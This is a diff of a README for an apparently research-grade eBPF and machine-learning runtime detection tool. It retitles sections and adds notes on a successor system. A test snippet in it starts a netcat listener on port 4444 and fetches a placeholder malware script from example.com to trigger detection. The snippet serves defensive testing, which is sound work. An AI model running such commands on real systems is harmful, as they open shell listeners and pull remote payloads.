@@ -1,5 +1,5 @@
 # SecureSME
-### Experimental Cloud-Native Runtime Detection Framework (eBPF + Kubernetes + ML)
+### v0 Research Platform — eBPF Runtime Detection (BCC + Isolation Forest)
 SecureSME is an experimental runtime security framework designed to evaluate the feasibility of combining kernel-level eBPF telemetry with unsupervised machine learning for detecting anomalous behavior in Kubernetes environments.
 
 The project explores a core research question:
@@ -70,8 +70,7 @@ graph TD
 * **DevSecOps Pipeline:** Integrated Bandit (SAST) and Safety dependency scanning into GitHub Actions to block vulnerable code.
 
 
-## Current Limitations & Architectural Roadmap
-
+## Lessons Learned — What This Platform Taught Us
 ### 1. Performance Evaluation (In Progress)
 - No high-throughput syscall benchmarking yet.
 - No quantified latency delta under load.
@@ -151,5 +150,12 @@ graph TD
     ```bash
     sudo docker run --rm alpine sh -c "apk add --no-cache netcat-openbsd && nc -lvp 4444 & wget [http://example.com/malware.sh](http://example.com/malware.sh)"
     ```
----
-*Engineered by Murashidzi as a demonstration of DevSecOps and Software Engineering principles.*
+
+
+
+*This platform is v0 of an ongoing research programme. The architectural lessons learned here (specifically the limitations of BCC overhead under load and the inability of tabular Isolation
+Forest models to detect sequence-level attack patterns) directly informed the design of the
+successor system. The successor implements libbpf + CO-RE for portable kernel instrumentation,
+a concurrent Go daemon using the cilium/ebpf library for zero-drop event processing, and an
+LSTM sequence model trained on syscall streams to detect temporal anomalies that frequency-based
+models miss. See: [sentinel-ebpf](https://github.com/Murashidzi/sentinel-ebpf) (in development).*
